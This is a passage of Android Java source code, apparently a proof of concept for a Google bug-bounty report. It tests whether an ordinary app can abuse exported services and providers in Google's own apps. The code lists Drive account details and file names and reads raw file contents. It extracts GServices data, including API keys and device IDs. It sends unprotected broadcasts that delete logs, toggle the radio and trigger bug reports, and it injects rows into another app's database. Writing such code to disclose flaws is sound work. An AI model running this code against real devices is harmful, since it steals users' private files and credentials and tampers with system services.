package com.vrppoc;

import android.app.Activity;
import android.content.ClipData;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

public class MainActivity extends Activity {
    private static final String TAG = "VRP_POC";
    private TextView tv;
    private StringBuilder sb = new StringBuilder();
    private int totalPermissions = 0;
    private int grantedPermissions = 0;
    private int servicesAttempted = 0;
    private int servicesBound = 0;
    private int leaksFound = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        tv = new TextView(this);
        tv.setPadding(20, 20, 20, 20);
        tv.setTextSize(11f);
        scroll.addView(tv);
        setContentView(scroll);

        log("========================================");
        log("  MULTI-APP GOOGLE VRP PoC v9");
        log("  Cross-App Permission & Provider Audit");
        log("========================================");
        log("Package: " + getPackageName());
        log("UID: " + android.os.Process.myUid());
        log("");

        phase1_permissions();
        phase2_messages_services();
        phase3_maps_assistant();
        phase4_lens_service();
        phase5_drive_providers();
        phase6_scone_broadcasts();
        phase7_gservices();
        phase8_new_services();
        phase10_deep_provider_scan();
        phase11_uri_grant_forwarding();
        phase9_summary();
    }

    private void phase1_permissions() {
        log("=== PHASE 1: Permission Auto-Grant Verification ===");
        log("Testing if normal permissions are auto-granted...\n");

        String[][] perms = {
            {"com.google.android.messages.rcs.PROVISIONING_EVENT", "Messages: RCS Provisioning"},
            {"com.google.android.apps.messaging.shared.satelliteapi.endpointservice.ACCESS_ENDPOINT_SERVICE", "Messages: Satellite Endpoint"},
            {"com.google.android.ims.services.ACCESS_MESSAGING_SERVICE", "Messages: IMS Messaging"},
            {"com.google.android.ims.messaging.ACCESS_MESSAGING_ENGINE_SERVICE", "Messages: Engine Service"},
            {"com.google.android.apps.messaging.services.ACCESS_MESSAGING_NOTIFICATION_SERVICE", "Messages: RCS Notification Server"},
            {"com.google.android.apps.maps.permission.ASSISTANT_GRPC_SYNC", "Maps: Assistant gRPC"},
            {"com.google.android.googlequicksearchbox.permission.LENS_SERVICE", "Lens: Service Binding"},
            {"com.google.android.providers.gsf.permission.READ_GSERVICES", "GSF: GServices Read"},
            {"com.google.android.gms.dck.permission.DIGITAL_KEY_READ", "GMS: Digital Car Key Read"},
            {"com.google.android.gms.dck.permission.DIGITAL_KEY_WRITE", "GMS: Digital Car Key Write"},
            {"com.google.android.apps.docs.permission.SYNC_STATUS", "Drive: Sync Status"},
            {"com.google.android.apps.safetyhub.carcrash.settings.READ", "SafetyHub: Car Crash Read"},
            {"com.google.android.apps.aicore.service.BIND_SERVICE", "AI Core: Bind Service"},
            {"com.google.android.gms.permission.INJECT_GESTURE_EVENT", "GMS: Inject Gesture"},
            {"com.google.android.gms.permission.ACTIVITY_RECOGNITION", "GMS: Activity Recognition"},
            {"com.google.android.gms.permission.AD_ID", "GMS: Ad ID"},
            {"com.google.android.apps.docs.editors.kix.permission.SYNC_STATUS", "Docs: Sync Status"},
            {"com.google.android.apps.docs.editors.trix.permission.SYNC_STATUS", "Sheets: Sync Status"},
            {"com.google.android.apps.docs.editors.punch.permission.SYNC_STATUS", "Slides: Sync Status"},
            {"com.google.android.settings.fuelgauge.READ_BATTERY_USAGE_DATA", "Settings: Battery Usage"},
            {"com.google.sensor.private.permission.USE_RAW_SENSOR", "Diagnostics: Raw Sensor"},
            {"com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE", "Play Store: Referrer"},
            {"com.google.android.setupwizard.READ_DEVICE_ORIGIN_FIRST_PARTY", "SetupWizard: Device Origin"},
            {"com.google.android.gms.permission.AD_ID_NOTIFICATION", "GMS: Ad ID Notification"},
            {"com.google.android.c2dm.permission.RECEIVE", "GMS: Cloud Messaging"},
            {"com.google.android.apps.scone.connectivitymonitor.permission.WRITE_NIMBUS_DATA", "Scone: Write Nimbus Data"},
            {"com.google.android.setupwizard.SETUP_COMPAT_SERVICE", "SetupWizard: Compat Service"},
        };

        for (String[] p : perms) {
            totalPermissions++;
            boolean granted = checkSelfPermission(p[0]) == PackageManager.PERMISSION_GRANTED;
            if (granted) grantedPermissions++;
            log("  " + (granted ? "[GRANTED]" : "[DENIED] ") + " " + p[1]);
        }
        log("\nResult: " + grantedPermissions + "/" + totalPermissions + " auto-granted\n");
    }

    private void phase2_messages_services() {
        log("=== PHASE 2: Google Messages Service Binding ===");
        log("5 normal permissions protect exported services\n");

        bindTarget(
            "com.google.android.apps.messaging",
            "com.google.android.apps.messaging.shared.satelliteapi.endpointservice.GrpcEndpointService",
            "Satellite gRPC Endpoint"
        );

        bindTarget(
            "com.google.android.apps.messaging",
            "com.google.android.apps.messaging.shared.rcs.messaging.MessagingEngineNotificationServer",
            "RCS Notification Server"
        );

        bindTarget(
            "com.google.android.apps.messaging",
            "com.google.android.ims.messaging.MessagingEngineEndpointService",
            "IMS Messaging Engine"
        );

        log("");
    }

    private void phase3_maps_assistant() {
        log("=== PHASE 3: Google Maps Assistant gRPC ===");
        log("ASSISTANT_GRPC_SYNC = protectionLevel normal\n");

        bindTarget(
            "com.google.android.apps.maps",
            "com.google.android.apps.gmm.car.assistant.service.AssistantEndpointService",
            "Maps Assistant gRPC"
        );

        log("");
    }

    private void phase4_lens_service() {
        log("=== PHASE 4: Google Lens Service ===");
        log("LENS_SERVICE = protectionLevel normal\n");

        Intent lensIntent = new Intent("com.google.android.lens.BIND");
        lensIntent.setComponent(new ComponentName(
            "com.google.android.googlequicksearchbox",
            "com.google.android.apps.search.lens.service.LensService"
        ));

        servicesAttempted++;
        try {
            boolean bound = bindService(lensIntent, new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name, IBinder service) {
                    servicesBound++;
                    log("  [BOUND] Google Lens connected!");
                    log("    Component: " + name.flattenToShortString());
                    log("    IBinder: " + service.getClass().getName());
                    probeInterface(service);
                    updateDisplay();
                }
                @Override
                public void onServiceDisconnected(ComponentName name) {}
            }, Context.BIND_AUTO_CREATE);
            log("  bindService(Lens) = " + bound);
        } catch (Exception e) {
            log("  [ERROR] " + e.getMessage());
        }

        log("");
    }

    private void phase5_drive_providers() {
        log("=== PHASE 5: Google Drive DocumentsProvider Access ===");
        log("Testing SAF DocumentsProvider for file listing + read\n");

        ContentResolver cr = getContentResolver();

        // 1. Query roots — reveals account email
        log("  --- Step 1: Query Drive roots ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.apps.docs.storage/root"),
                null, null, null, null);
            if (c != null && c.moveToFirst()) {
                leaksFound++;
                log("  [LEAK] Drive root: " + c.getCount() + " account(s)");
                do {
                    String title = c.getString(c.getColumnIndex("title"));
                    String summary = c.getString(c.getColumnIndex("summary"));
                    String docId = c.getString(c.getColumnIndex("document_id"));
                    log("    Account: " + summary + " (" + title + ")");
                    log("    Root doc_id: " + docId);
                } while (c.moveToNext());
                c.close();
            } else {
                log("  Drive roots: no data");
            }
        } catch (SecurityException se) {
            log("  [BLOCKED] Drive roots: " + se.getMessage());
        } catch (Exception e) {
            log("  Drive roots: " + e.getClass().getSimpleName() + " - " + e.getMessage());
        }

        // 2. List My Drive files — reveals all file names/types/sizes/dates
        log("\n  --- Step 2: Enumerate My Drive files ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.apps.docs.storage/document/acc%3D1%3Bview%3Dmydrive/children"),
                null, null, null, null);
            if (c != null) {
                leaksFound++;
                log("  [LEAK] My Drive: " + c.getCount() + " items");
                int shown = 0;
                while (c.moveToNext() && shown < 8) {
                    String name = c.getString(c.getColumnIndex("_display_name"));
                    String mime = c.getString(c.getColumnIndex("mime_type"));
                    String sizeStr = c.getString(c.getColumnIndex("_size"));
                    log("    " + name + " [" + mime + "] size=" + (sizeStr != null ? sizeStr : "dir"));
                    shown++;
                }
                if (c.getCount() > 8) {
                    log("    ... and " + (c.getCount() - 8) + " more files");
                }
                c.close();
            }
        } catch (SecurityException se) {
            log("  [BLOCKED] My Drive listing: " + se.getMessage());
        } catch (Exception e) {
            log("  My Drive listing: " + e.getClass().getSimpleName() + " - " + e.getMessage());
        }

        // 3. List Shared with me — reveals files from other users
        log("\n  --- Step 3: Enumerate Shared with me ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.apps.docs.storage/document/acc%3D1%3Bview%3Dshared_with_me/children"),
                null, null, null, null);
            if (c != null && c.getCount() > 0) {
                leaksFound++;
                log("  [LEAK] Shared with me: " + c.getCount() + " items");
                int shown = 0;
                while (c.moveToNext() && shown < 5) {
                    String name = c.getString(c.getColumnIndex("_display_name"));
                    String mime = c.getString(c.getColumnIndex("mime_type"));
                    log("    " + name + " [" + mime + "]");
                    shown++;
                }
                c.close();
            }
        } catch (SecurityException se) {
            log("  [BLOCKED] Shared listing: " + se.getMessage());
        } catch (Exception e) {
            log("  Shared listing: " + e.getClass().getSimpleName());
        }

        // 4. Read actual file content — the critical impact proof
        log("\n  --- Step 4: Read file content (openFile) ---");
        // Find a non-virtual file from the listing
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.apps.docs.storage/document/acc%3D1%3Bview%3Dshared_with_me/children"),
                null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String mime = c.getString(c.getColumnIndex("mime_type"));
                    String name = c.getString(c.getColumnIndex("_display_name"));
                    String docId = c.getString(c.getColumnIndex("document_id"));
                    // Skip Google virtual docs, pick a real file
                    if (mime != null && !mime.startsWith("vnd.android") && !mime.contains("google-apps")) {
                        log("  Attempting to read: " + name + " (" + mime + ")");
                        try {
                            String encodedId = Uri.encode(docId);
                            java.io.InputStream is = cr.openInputStream(
                                Uri.parse("content://com.google.android.apps.docs.storage/document/" + encodedId));
                            if (is != null) {
                                byte[] buf = new byte[256];
                                int read = is.read(buf);
                                is.close();
                                if (read > 0) {
                                    leaksFound++;
                                    log("  [FILE READ!] Read " + read + " bytes from " + name);
                                    // Show first bytes as hex
                                    StringBuilder hex = new StringBuilder();
                                    for (int i = 0; i < Math.min(read, 40); i++) {
                                        hex.append(String.format("%02x ", buf[i]));
                                    }
                                    log("    First bytes: " + hex.toString().trim());
                                    // Try as text
                                    String txt = new String(buf, 0, Math.min(read, 100), "UTF-8");
                                    String clean = txt.replaceAll("[^\\x20-\\x7E]", ".");
                                    log("    As text: " + clean);
                                    log("  IMPACT: Any app can read Google Drive file content!");
                                }
                            }
                        } catch (Exception e) {
                            log("    Read failed: " + e.getClass().getSimpleName() + " - " + e.getMessage());
                        }
                        break;
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            log("  File read test: " + e.getClass().getSimpleName());
        }

        // SafetyHub Car Crash Settings (requires normal perm we have)
        log("\n  --- SafetyHub Car Crash Settings ---");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.apps.safetyhub.carcrash"),
                null, null, null, null);
            if (c != null) {
                log("  [ACCESS] CarCrash: " + c.getCount() + " rows");
                if (c.getCount() > 0 && c.moveToFirst()) {
                    String[] cols = c.getColumnNames();
                    log("  Columns: " + String.join(", ", cols));
                    do {
                        StringBuilder row = new StringBuilder("    ");
                        for (int i = 0; i < Math.min(cols.length, 5); i++) {
                            try {
                                row.append(cols[i]).append("=").append(c.getString(i)).append(", ");
                            } catch (Exception ex) {}
                        }
                        log(row.toString());
                    } while (c.moveToNext());
                } else {
                    log("  [ACCESS] CarCrash: accessible (empty)");
                }
                c.close();
            } else {
                log("  [ACCESS] CarCrash: accessible (null)");
            }
        } catch (SecurityException se) {
            log("  [BLOCKED] CarCrash: " + se.getMessage());
        } catch (Exception e) {
            log("  [ACCESS] CarCrash: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // GServices - CRITICAL: uses selectionArgs (4th param), NOT selection (3rd)
        log("\n  --- GServices from app (selectionArgs fix) ---");
        String[] gserviceKeys = {"android_id", "digest", "checkin_last_checkin_time"};
        for (String key : gserviceKeys) {
            try {
                Cursor c = cr.query(
                    Uri.parse("content://com.google.android.gsf.gservices"),
                    null, null, new String[]{key}, null);
                if (c != null) {
                    if (c.moveToFirst()) {
                        String val = c.getString(1);
                        log("  [LEAK] " + key + " = " +
                            (val != null ? val.substring(0, Math.min(40, val.length())) : "null"));
                    } else {
                        log("  [EMPTY] " + key);
                    }
                    c.close();
                }
            } catch (Exception e) {
                log("  [ERR] " + key + ": " + e.getClass().getSimpleName());
            }
        }
        // Full prefix dump - pass empty string as selectionArgs to get ALL entries
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.gsf.gservices/prefix"),
                null, null, new String[]{""}, null);
            if (c != null) {
                int total = c.getCount();
                log("  [LEAK] prefix dump: " + total + " entries");
                if (c.moveToFirst()) {
                    int shown = 0;
                    int apiKeys = 0;
                    int urls = 0;
                    do {
                        String name = c.getString(0);
                        String val = c.getString(1);
                        if (val != null && val.startsWith("AIzaSy")) apiKeys++;
                        if (name != null && (name.contains("url") || name.contains("endpoint"))) urls++;
                        if (shown < 8) {
                            log("    " + name + " = " +
                                (val != null ? val.substring(0, Math.min(50, val.length())) : "null"));
                            shown++;
                        }
                    } while (c.moveToNext());
                    log("  API keys: " + apiKeys + ", URLs: " + urls);
                    if (apiKeys > 0) {
                        c.moveToFirst();
                        int ak = 0;
                        do {
                            String v = c.getString(1);
                            if (v != null && v.startsWith("AIzaSy") && ak < 3) {
                                log("  [KEY] " + c.getString(0) + " = " + v);
                                ak++;
                            }
                        } while (c.moveToNext() && ak < 3);
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            log("  prefix: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");
    }

    private void phase6_scone_broadcasts() {
        log("=== PHASE 6: Carrier Services Broadcast Injection ===");
        log("CMBroadCastReceiver: exported, NO permission\n");

        String pkg = "com.google.android.apps.scone";
        String cls = "com.google.android.apps.scone.connectivitymonitor.CMBroadCastReceiver";

        String[][] broadcasts = {
            {"com.google.android.apps.scone.ACTION_RADIO_TOGGLE",
             "Radio state toggle"},
            {"com.google.android.apps.scone.connectivitymonitor.action.NIMBUS_DELETE_CONNECTIVITY_EVENTS",
             "Delete connectivity logs"},
            {"com.google.android.apps.scone.connectivitymonitor.action.NIMBUS_CREATE_TEST_DB",
             "Create test DB"},
            {"com.google.android.apps.scone.connectivitymonitor.action.BUGREPORT",
             "Trigger bugreport"},
        };

        int sent = 0;
        for (String[] bc : broadcasts) {
            try {
                Intent intent = new Intent(bc[0]);
                intent.setComponent(new ComponentName(pkg, cls));
                sendBroadcast(intent);
                log("  [SENT] " + bc[1]);
                sent++;
            } catch (Exception e) {
                log("  [FAIL] " + bc[1] + ": " + e.getMessage());
            }
        }
        log("\n  " + sent + "/4 broadcasts accepted by Carrier Services");
        log("");
    }

    private void phase7_gservices() {
        log("=== PHASE 7: GServices Full Extraction ===");
        log("READ_GSERVICES = protectionLevel normal");
        log("Key insight: provider uses selectionArgs, not selection\n");

        ContentResolver cr = getContentResolver();
        try {
            // Full dump via prefix query with empty string selectionArgs
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.gsf.gservices/prefix"),
                null, null, new String[]{""}, null);
            if (c != null) {
                int total = c.getCount();
                log("  [LEAK] Total GServices entries: " + total);

                if (total > 0 && c.moveToFirst()) {
                    int apiKeys = 0, urls = 0, certs = 0, auth = 0;
                    do {
                        String name = c.getString(0);
                        String value = c.getString(1);
                        if (name == null) continue;
                        if (value != null && value.startsWith("AIzaSy")) apiKeys++;
                        if (name.contains("url") || name.contains("endpoint")) urls++;
                        if (name.contains("cert")) certs++;
                        if (name.contains("auth") || name.contains("token")) auth++;
                    } while (c.moveToNext());

                    log("    API Keys: " + apiKeys);
                    log("    URLs/Endpoints: " + urls);
                    log("    Certificates: " + certs);
                    log("    Auth/Token configs: " + auth);

                    if (apiKeys > 0) {
                        c.moveToFirst();
                        int shown = 0;
                        log("\n  Sample leaked API keys:");
                        do {
                            String v = c.getString(1);
                            if (v != null && v.startsWith("AIzaSy") && shown < 5) {
                                log("    " + c.getString(0) + " = " + v);
                                shown++;
                            }
                        } while (c.moveToNext() && shown < 5);
                    }

                    // Show some sensitive-looking entries
                    c.moveToFirst();
                    int shown2 = 0;
                    log("\n  Sample entries:");
                    do {
                        if (shown2 < 10) {
                            String n = c.getString(0);
                            String v = c.getString(1);
                            log("    " + n + " = " +
                                (v != null ? v.substring(0, Math.min(60, v.length())) : "null"));
                            shown2++;
                        }
                    } while (c.moveToNext() && shown2 < 10);
                }
                c.close();
            } else {
                log("  Query returned null cursor");
            }
        } catch (Exception e) {
            log("  [ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Also query specific sensitive keys
        log("\n  Targeted key queries:");
        String[] sensitiveKeys = {"android_id", "digest", "url:usage_reporting_upload_url",
            "gms:ads:adid_app_whitelist", "finsky:billing_url"};
        for (String key : sensitiveKeys) {
            try {
                Cursor c = cr.query(
                    Uri.parse("content://com.google.android.gsf.gservices"),
                    null, null, new String[]{key}, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(1);
                    log("    " + key + " = " + (val != null ? val.substring(0, Math.min(60, val.length())) : "null"));
                    c.close();
                }
            } catch (Exception e) {}
        }
        log("");
    }

    private void phase8_new_services() {
        log("=== PHASE 8: Additional Service & Provider Probes ===\n");

        ContentResolver cr = getContentResolver();

        // Battery Usage - uses our normal permission READ_BATTERY_USAGE_DATA
        log("  --- Battery Usage (normal perm) ---");
        testProvider(cr, "content://com.android.settings.fuelgauge.battery_usage_state",
            "Battery Usage State");
        testProvider(cr, "content://com.android.settings.battery.usage.provider",
            "Battery Usage Provider");
        // Try call() on battery
        try {
            Bundle result = cr.call(
                Uri.parse("content://com.android.settings.fuelgauge.battery_usage_state"),
                "getBatteryUsageState", null, null);
            if (result != null) {
                log("  [LEAK] Battery call(): Bundle(" + result.size() + " keys)");
                for (String key : result.keySet()) {
                    log("    " + key + "=" + result.get(key));
                }
            }
        } catch (Exception e) {
            log("  Battery call(): " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Google Docs editors storage.legacy (accessible from shell)
        log("\n  --- Docs Editors (uses SYNC_STATUS perm) ---");
        testProvider(cr, "content://com.google.android.apps.docs.editors.kix.storage.legacy",
            "Google Docs Legacy Storage");
        testProvider(cr, "content://com.google.android.apps.docs.editors.kix.statesyncer",
            "Google Docs StateSync");
        testProvider(cr, "content://com.google.android.apps.docs.editors.punch.statesyncer",
            "Google Slides StateSync");

        // Google Camera metrics (accessible from shell)
        log("\n  --- Camera & Sensor ---");
        try {
            Bundle result = cr.call(
                Uri.parse("content://com.google.android.GoogleCamera.MetricsProvider"),
                "dump", null, null);
            if (result != null) {
                log("  [LEAK] Camera Metrics call(dump): " + result.size() + " keys");
                for (String key : result.keySet()) {
                    Object val = result.get(key);
                    String vs = val != null ? val.toString() : "null";
                    log("    " + key + "=" + vs.substring(0, Math.min(60, vs.length())));
                }
            } else {
                log("  Camera Metrics call(dump): null");
            }
        } catch (Exception e) {
            log("  Camera Metrics: " + e.getClass().getSimpleName());
        }

        // Scone ConnectivityHelper (accessible, needs paths)
        log("\n  --- Scone ConnectivityHelper ---");
        try {
            Bundle result = cr.call(
                Uri.parse("content://com.google.android.connectivitymonitor.connectivityhelperprovider"),
                "getConnectivityStatus", null, null);
            if (result != null) {
                log("  [LEAK] Connectivity call(): " + result.size() + " keys");
                for (String key : result.keySet()) {
                    log("    " + key + "=" + result.get(key));
                }
            }
        } catch (Exception e) {
            log("  Connectivity call(): " + e.getClass().getSimpleName());
        }

        // Flipendo (battery saver state)
        log("\n  --- Flipendo (Battery Saver) ---");
        try {
            Bundle result = cr.call(
                Uri.parse("content://com.google.android.flipendo.api"),
                "getState", null, null);
            if (result != null) {
                log("  [LEAK] Flipendo State: " + result.size() + " keys");
                for (String key : result.keySet()) {
                    log("    " + key + "=" + result.get(key));
                }
            }
        } catch (Exception e) {
            log("  Flipendo: " + e.getClass().getSimpleName());
        }

        // Turbo (Adaptive Battery)
        testProvider(cr, "content://com.google.android.apps.turbo", "Turbo/Adaptive Battery");
        testProvider(cr, "content://com.google.android.apps.turbo.provider", "Turbo Provider");

        // Files by Google
        testProvider(cr, "content://com.google.android.apps.nbu.files", "Files by Google");

        // Google Wallet NFC
        testProvider(cr, "content://com.google.android.apps.walletnfcrel", "Google Wallet");

        // Now Playing (Pixel ambient music)
        testProvider(cr, "content://com.google.android.apps.pixel.nowplaying", "Now Playing");

        log("");
    }

    private void phase10_deep_provider_scan() {
        log("=== PHASE 10: Deep Provider Scan (26 normal perms) ===\n");
        ContentResolver cr = getContentResolver();

        // 1. SetupWizard DeviceOrigin (we have READ_DEVICE_ORIGIN_FIRST_PARTY)
        log("--- SetupWizard DeviceOrigin ---");
        testProvider(cr, "content://com.google.android.setupwizard.deviceorigin", "DeviceOrigin");
        testProvider(cr, "content://com.google.android.setupwizard.deviceorigin/origin", "DeviceOrigin/origin");
        tryCall(cr, "content://com.google.android.setupwizard.deviceorigin", "getDeviceOrigin", "DeviceOrigin call()");
        tryCall(cr, "content://com.google.android.setupwizard.deviceorigin", "get", "DeviceOrigin get()");

        // 2. SetupWizard partner/FEATURES
        log("\n--- SetupWizard Config ---");
        tryCall(cr, "content://com.google.android.setupwizard.partner", "get_value", "Partner get_value()");
        tryCall(cr, "content://com.google.android.setupwizard.FEATURES", "getFeatures", "Features getFeatures()");
        tryCall(cr, "content://com.google.android.setupwizard.FEATURES", "dump", "Features dump()");
        testProvider(cr, "content://com.google.android.setupwizard.capability", "SetupWizard Capability");

        // 3. SafetyHub CarCrash (we have READ permission)
        log("\n--- SafetyHub CarCrash Settings ---");
        testProvider(cr, "content://com.google.android.apps.safetyhub.carcrash", "CarCrash base");
        testProvider(cr, "content://com.google.android.apps.safetyhub.carcrash/settings", "CarCrash settings");
        tryCall(cr, "content://com.google.android.apps.safetyhub.carcrash", "getSettings", "CarCrash getSettings()");

        // 4. Scone NimbusProvider (we have WRITE_NIMBUS_DATA - integrity impact!)
        log("\n--- Scone Nimbus (WRITE permission = INTEGRITY) ---");
        testProvider(cr, "content://com.google.android.apps.scone.connectivitymonitor.nimbusprovider",
            "Nimbus READ");
        // Try INSERT — we have writePermission WRITE_NIMBUS_DATA
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("key", "vrp_poc_test");
            cv.put("value", "injected_by_third_party_app");
            Uri inserted = cr.insert(
                Uri.parse("content://com.google.android.apps.scone.connectivitymonitor.nimbusprovider"),
                cv);
            if (inserted != null) {
                leaksFound++;
                log("  [WRITE!] Nimbus INSERT succeeded: " + inserted);
                log("  INTEGRITY IMPACT: Third-party app can write to connectivity monitoring DB");
                // Clean up - try to delete what we inserted
                try {
                    cr.delete(inserted, null, null);
                    log("  (Cleaned up test entry)");
                } catch (Exception de) {
                    log("  (Cleanup failed: " + de.getClass().getSimpleName() + ")");
                }
            } else {
                log("  Nimbus INSERT: returned null (may have been rejected)");
            }
        } catch (SecurityException se) {
            log("  Nimbus INSERT: SecurityException - " + se.getMessage());
        } catch (Exception e) {
            log("  Nimbus INSERT: " + e.getClass().getSimpleName() + " - " + e.getMessage());
        }
        // Also try update
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("value", "modified_by_vrp_poc");
            int rows = cr.update(
                Uri.parse("content://com.google.android.apps.scone.connectivitymonitor.nimbusprovider"),
                cv, "key=?", new String[]{"vrp_poc_test"});
            log("  Nimbus UPDATE: " + rows + " rows affected");
        } catch (SecurityException se) {
            log("  Nimbus UPDATE: SecurityException");
        } catch (Exception e) {
            log("  Nimbus UPDATE: " + e.getClass().getSimpleName());
        }
        // Try with /data path too
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("key", "vrp_test_data");
            cv.put("value", "injected");
            Uri inserted = cr.insert(
                Uri.parse("content://com.google.android.apps.scone.connectivitymonitor.nimbusprovider/data"),
                cv);
            if (inserted != null) {
                leaksFound++;
                log("  [WRITE!] Nimbus /data INSERT succeeded: " + inserted);
            }
        } catch (SecurityException se) {
            log("  Nimbus /data INSERT: SecurityException");
        } catch (Exception e) {
            log("  Nimbus /data INSERT: " + e.getClass().getSimpleName() + " - " + e.getMessage());
        }
        tryCall(cr, "content://com.google.android.connectivitymonitor.connectivityhelperprovider",
            "getState", "ConnHelper getState()");
        testProvider(cr, "content://com.google.android.apps.scone.geofence", "Scone Geofence");

        // 5. Phenotype (Google's feature flag system - accessible from shell)
        log("\n--- GMS Phenotype (Feature Flags) ---");
        testProvider(cr, "content://com.google.android.gms.phenotype", "Phenotype base");
        testProvider(cr, "content://com.google.android.gms.phenotype/com.google.android.gms",
            "Phenotype/gms");
        testProvider(cr, "content://com.google.android.gms.phenotype/com.google.android.apps.photos",
            "Phenotype/photos");
        // Try to list all registered experiments
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.gms.phenotype"),
                null, null, null, null);
            if (c != null) {
                int count = c.getCount();
                if (count > 0) {
                    leaksFound++;
                    log("  [LEAK] Phenotype: " + count + " entries");
                    log("    Columns: " + String.join(", ", c.getColumnNames()));
                    int shown = 0;
                    while (c.moveToNext() && shown < 10) {
                        StringBuilder row = new StringBuilder("    ");
                        for (int i = 0; i < Math.min(c.getColumnCount(), 4); i++) {
                            String v = c.getString(i);
                            row.append(c.getColumnName(i) + "=");
                            row.append(v != null ? v.substring(0, Math.min(40, v.length())) : "null");
                            row.append(" | ");
                        }
                        log(row.toString());
                        shown++;
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            log("  Phenotype query: " + e.getClass().getSimpleName());
        }

        // 6. Wellbeing API (accessible, query not supported - try call)
        log("\n--- Wellbeing API (call() returns tts_config byte[]) ---");
        tryCall(cr, "content://com.google.android.apps.wellbeing.api", "getSettings", "Wellbeing getSettings()");
        tryCall(cr, "content://com.google.android.apps.wellbeing.api", "get_bedtime_mode", "Wellbeing getBedtime()");
        tryCall(cr, "content://com.google.android.apps.wellbeing.api", "get_focus_mode", "Wellbeing getFocus()");
        tryCall(cr, "content://com.google.android.apps.wellbeing.api", "get_app_timers", "Wellbeing getTimers()");
        testProvider(cr, "content://com.google.android.apps.wellbeing.slices", "Wellbeing Slices");
        testProvider(cr, "content://com.google.android.apps.wellbeing.autodnd.ui.provider",
            "Wellbeing AutoDND");

        // 7. GMS providers via call() (wallet, auth accessible but query unsupported)
        log("\n--- GMS Providers via call() ---");
        tryCall(cr, "content://com.google.android.gms.auth.accounts", "getAccounts", "Auth getAccounts()");
        tryCall(cr, "content://com.google.android.gms.wallet", "getWalletInfo", "Wallet getInfo()");
        tryCall(cr, "content://com.google.android.gms.nearby.sharing", "getState", "NearbyShare getState()");
        tryCall(cr, "content://com.google.android.gms.nearby.fastpair", "getDevices", "FastPair getDevices()");
        tryCall(cr, "content://com.google.android.gms.security.provider", "getInfo", "SecurityProvider getInfo()");

        // 8. GMS Thunderbird (emergency/satellite config)
        log("\n--- GMS Thunderbird (Emergency) ---");
        tryCall(cr, "content://com.google.android.gms.thunderbird.config", "getConfig",
            "Thunderbird getConfig()");
        testProvider(cr, "content://com.google.android.gms.thunderbird.config/emergency",
            "Thunderbird emergency");
        testProvider(cr, "content://com.google.android.gms.thunderbird.settings",
            "Thunderbird settings");

        // 9. Flipendo providers
        log("\n--- Flipendo (Battery Extreme) ---");
        testProvider(cr, "content://com.google.android.flipendo.settings.SettingsSummaryContentProvider",
            "Flipendo Summary");
        tryCall(cr, "content://com.google.android.flipendo.settings.SettingsSummaryContentProvider",
            "getSummary", "Flipendo getSummary()");

        // 10. Gboard/Keyboard debug bridge
        log("\n--- Gboard WebDebugBridge ---");
        testProvider(cr, "content://com.google.android.inputmethod.latin.webdebugbridge",
            "Gboard WebDebug");
        tryCall(cr, "content://com.google.android.inputmethod.latin.webdebugbridge",
            "getConfig", "Gboard getConfig()");

        // 11. Additional GMS providers
        log("\n--- GMS Additional ---");
        testProvider(cr, "content://com.google.android.gms.settings.gms", "GMS Settings");
        tryCall(cr, "content://com.google.android.gms.settings.gms", "getSettings", "GMS Settings call()");
        testProvider(cr, "content://com.google.android.gms.settings.persistent", "GMS Persistent Settings");
        tryCall(cr, "content://com.google.android.gms.settings.persistent", "getSettings", "GMS Persistent call()");
        testProvider(cr, "content://com.google.android.gms.common.appdoctor", "GMS AppDoctor");

        // 14. Try GMS Settings call() with specific methods
        log("\n--- GMS Settings via call() ---");
        tryCall(cr, "content://com.google.android.gms.settings.gms", "get_value", "GMS get_value()");
        tryCall(cr, "content://com.google.android.gms.settings.gms", "list", "GMS list()");

        // 15. DeviceOrigin deeper testing
        log("\n--- DeviceOrigin deeper ---");
        tryCall(cr, "content://com.google.android.setupwizard.deviceorigin", "read", "DeviceOrigin read()");
        // Try query with our permission
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.android.setupwizard.deviceorigin"),
                null, null, null, null);
            if (c != null) {
                log("  [LEAK] DeviceOrigin query: " + c.getCount() + " rows");
                if (c.getCount() > 0) {
                    leaksFound++;
                    log("    Columns: " + String.join(", ", c.getColumnNames()));
                    while (c.moveToNext()) {
                        StringBuilder row = new StringBuilder("    ");
                        for (int i = 0; i < c.getColumnCount(); i++) {
                            row.append(c.getColumnName(i) + "=" + c.getString(i) + " | ");
                        }
                        log(row.toString());
                    }
                }
                c.close();
            }
        } catch (SecurityException se) {
            log("  DeviceOrigin query: SecurityException (" + se.getMessage() + ")");
        } catch (Exception e) {
            log("  DeviceOrigin query: " + e.getClass().getSimpleName());
        }

        // 12. Cell Broadcast provider
        log("\n--- Cell Broadcast ---");
        testProvider(cr, "content://cellbroadcasts", "Cell Broadcasts");
